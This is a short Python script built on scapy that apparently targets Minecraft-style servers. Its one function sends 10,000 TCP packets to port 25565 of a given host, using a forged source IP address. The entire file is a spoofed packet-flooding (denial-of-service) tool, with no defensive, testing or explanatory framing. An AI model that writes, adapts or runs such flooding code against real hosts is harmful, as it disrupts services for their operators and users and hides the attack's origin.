import scapy.all as sc

def res_tcp(ip_dst, ip_src):
    try:
        i=0
        while i<10000:
            sc.send(sc.IP(src=ip_src,dst=ip_dst)/sc.TCP(dport=25565))
            i+=1
    except :
        print("Error al enviar los paquetes")